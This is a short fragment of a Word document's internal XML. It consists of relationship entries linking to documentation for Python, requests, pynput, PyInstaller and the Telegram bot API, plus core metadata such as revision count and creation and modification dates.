    <w:rsid w:val="00497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requests.org/" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://pynput.readthedocs.i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python.org/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yinstaller.org/" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings" Target="settings.xml"/><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://core.telegram.org/bot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 M</cp:lastModifiedBy>
  <cp:revision>3</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2013-12-23T23:15:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-09-28T17:25:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>